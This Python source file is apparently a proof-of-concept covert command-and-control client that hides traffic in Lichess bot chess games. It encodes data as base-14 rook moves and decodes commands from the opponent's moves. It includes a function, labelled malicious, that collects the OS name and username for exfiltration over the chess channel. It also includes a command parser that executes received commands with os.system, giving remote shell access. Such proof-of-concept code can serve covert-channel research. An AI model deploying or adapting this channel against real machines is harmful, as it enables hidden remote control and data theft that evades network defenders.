import os
import json
import requests
import threading
import random



with open("config.json" , "r") as f:
    configs = f.read()
    configs = json.loads(configs)

server_username = configs["server_username"]
client_username = configs["client_username"]
client_api_token = configs["client_api_key"]

auth_header = {
    "Authorization":f"Bearer {client_api_token}"
}

#create challenge to make a channel for communication
payload = {
    "rated":False,
    "days":14,
    "color":"white",
    "variant":"standard",

}

client_initialize_moves = ["h2h4" , "g2g4" , "f2f4" , "e2e4" , "d2d4" , "c2c4" , "b2b4" , "a2a4" , "d4c5" , "d1d4" , "g4f5" , "c1f4" , "a1a2" , "h1h3" , "h3a3"]
initialize_threshold = len(client_initialize_moves)*2

def string_to_base14(string):
    combined_int = 0
    for char in string:
        combined_int = combined_int * 256 + ord(char)
    
    if combined_int == 0:
        return '0'
    digits = "0123456789abcd"
    base14 = ""
    while combined_int > 0:
        remainder = combined_int % 14
        base14 = digits[remainder] + base14
        combined_int = combined_int // 14
    return base14

def base14_to_string(b14):
    digits = "0123456789abcd"
    value = 0
    for char in b14:
        value = value * 14 + digits.index(char)
    
    chars = []
    while value > 0:
        value, remainder = divmod(value, 256)
        chars.append(chr(remainder))
    return ''.join(reversed(chars))

global queen_current_position
global rook_one_current_position
global rook_two_current_position
global bishop_current_position

queen_current_position = "d5"
rook_one_current_position = "a7"
rook_two_current_position = "a6"
bishop_current_position = "f5"

global client_queen_current_position
global client_rook_one_current_position
global client_rook_two_current_position
global client_bishop_current_position

client_queen_current_position = "d1"
client_rook_one_current_position = "a1"
client_rook_two_current_position = "h1"
client_bishop_current_position = "c1"

global transmit_message
transmit_message = ""

global msg_recieved
msg_recieved = ""

def actual_malicious_payload():
    global transmit_message

    import getpass
    import platform

    username = getpass.getuser()
    os_name = platform.system()
    stolen_info = os_name+","+username
    stolen_info = "client_test"
    transmit_message = string_to_base14(json.dumps(stolen_info))

threading.Thread(target=actual_malicious_payload , args=()).start()

def make_move(uci_notation , game_id):
    global client_queen_current_position
    global client_rook_one_current_position
    global client_rook_two_current_position
    global client_bishop_current_position

    r = requests.post(f"https://lichess.org/api/bot/game/{game_id}/move/{uci_notation}" , headers=auth_header)
    start_pos = uci_notation[:2:]
    end_pos = uci_notation[2::]
    if start_pos == client_queen_current_position:
        client_queen_current_position = end_pos
    if start_pos == client_rook_one_current_position:
        client_rook_one_current_position = end_pos
    if start_pos == client_rook_two_current_position:
        client_rook_two_current_position = end_pos
    if start_pos == client_bishop_current_position:
        client_bishop_current_position = end_pos

def transmission_row_trickery(char):

    global client_rook_one_current_position
    global client_rook_two_current_position

    base_14_dict = {
        10:"a",
        11:"b",
        12:"c",
        13:"d"
    }

    try:
        char_c = int(char)
    except:
        for numb in base_14_dict:
            if base_14_dict[numb] == char:
                char_c = numb
        
    if char_c < 7:
        prenumb = 7
        rook_number = "2"
        current_pos = client_rook_one_current_position
    else:
        prenumb = 0
        rook_number = "3"
        current_pos = client_rook_two_current_position

    
    i = 7 - prenumb
    for col in ["a" , "b" , "c" , "d" , "e" , "f" , "g" , "h"]:
        if current_pos[0] != col:
            if i in base_14_dict:
                actual = base_14_dict[i]
            else:
                actual = i
            if str(actual) == char:
                return  f"{current_pos}{col}{rook_number}"
            i = i + 1



def row_trickery(current_pos , end_pos , prenumb):
    i = 0 + prenumb
    dict = {}
    for col in ["a" , "b" , "c" , "d" , "e" , "f" , "g" , "h"]:
        if current_pos[0] != col:
            dict[col] = i
            i = i + 1

    data = dict[end_pos[0]]
    base_14_dict = {
        10:"a",
        11:"b",
        12:"c",
        13:"d"
    }

    if data in base_14_dict:
        data = base_14_dict[data]

    return data

def command_parser(msg):
    #for this poc, it prints the command recieved and then simply uses the os module to run the command
    msg = base14_to_string(msg)
    print(f"[*] Recieved command from server {msg}")
    os.system(msg)

def move_decipher(move_chain , game_id):

    global client_queen_current_position
    global client_rook_one_current_position
    global client_rook_two_current_position
    global client_bishop_current_position
    global msg_recieved

    global queen_current_position
    global rook_one_current_position
    global rook_two_current_position
    global bishop_current_position
    global transmit_message

    move = move_chain[-1]
    start_pos = move[:2:]
    end_pos = move[2::]
    if start_pos == queen_current_position:
        queen_current_position = end_pos
        
    if "d" in queen_current_position:
        if start_pos == rook_one_current_position:
            numerical = row_trickery(start_pos , end_pos , 0)
            msg_recieved = msg_recieved + str(numerical)
            rook_one_current_position = end_pos
        elif start_pos == rook_two_current_position:
            numerical = row_trickery(start_pos , end_pos , 7)
            msg_recieved = msg_recieved + str(numerical)
            rook_two_current_position = end_pos
        elif start_pos == bishop_current_position:
            msg_recieved = msg_recieved + msg_recieved[-1]
            bishop_current_position = end_pos
    else:
        if start_pos == rook_one_current_position:
            rook_one_current_position = end_pos
        elif start_pos == rook_two_current_position:
            rook_two_current_position = end_pos
        elif start_pos == bishop_current_position:
            bishop_current_position = end_pos
        if msg_recieved:
            command_parser(msg_recieved)
            msg_recieved = ""

    if not transmit_message:
        #put it into silence mode
        if "d" in client_queen_current_position:
            make_move("d4c4" , game_id)
        else:
            random_rook = random.randint(2 , 3)
            if random_rook == 2:
                choices = ["a" , "b" , "c" , "d" , "e" , "f" , "g" , "h"]
                choices.remove(client_rook_one_current_position[0])
                random_place = random.choice(choices)
                make_move(f"{client_rook_one_current_position}{random_place}{random_rook}" , game_id)
            else:
                choices = ["a" , "b" , "c" , "d" , "e" , "f" , "g" , "h"]
                choices.remove(client_rook_two_current_position[0])
                random_place = random.choice(choices)
                make_move(f"{client_rook_two_current_position}{random_place}{random_rook}" , game_id)
    else:
        if "c" in client_queen_current_position:
            make_move("c4d4" , game_id)
        else:
            char = transmit_message[0]
            move_to_make = transmission_row_trickery(char)
            make_move(move_to_make , game_id)
            transmit_message = transmit_message[1::]

global transmission_started_yet
transmission_started_yet = False
def board_preprocessing(move_chain , state , game_id):
    global transmission_started_yet
    move_chain = move_chain.split()
    moves_played = len(move_chain)

    if moves_played < initialize_threshold:
        state = "initialize"
    else:
        state = "transmission"

    if moves_played % 2 == 0:
        my_move = True
        if state == "initialize":
            make_move(client_initialize_moves[moves_played//2] , game_id)
        if state == "transmission":
            if not transmission_started_yet:
                transmission_started_yet = True
            move_decipher(move_chain , game_id)
                
    else:
        my_move = False
    
    return state
    

r = requests.post(f"https://lichess.org/api/challenge/{server_username}" , headers=auth_header,json=payload)
print("[*] Made challenge")

server_connected = False
while not server_connected:
    print("[*] Waiting for server connection")
    with requests.get(f"https://lichess.org/api/stream/event" , headers=auth_header, stream=True) as r:
        for line in r.iter_lines():
            if line:
                data = json.loads(line)
                if data["type"] == "gameStart":
                    game_id = data["game"]["gameId"]
                    server_connected = True
                    break

print("[*] Connected to server")
state = "initialize"
game_running = True
while game_running:
    with requests.get(f"https://lichess.org/api/bot/game/stream/{game_id}" , headers=auth_header , stream=True) as r:
        for line in r.iter_lines():
            if line:
                data = json.loads(line)
                if "state" in data:
                    moves = data["state"]["moves"]
                else:
                    moves = data["moves"]
                state = board_preprocessing(moves , state , game_id)




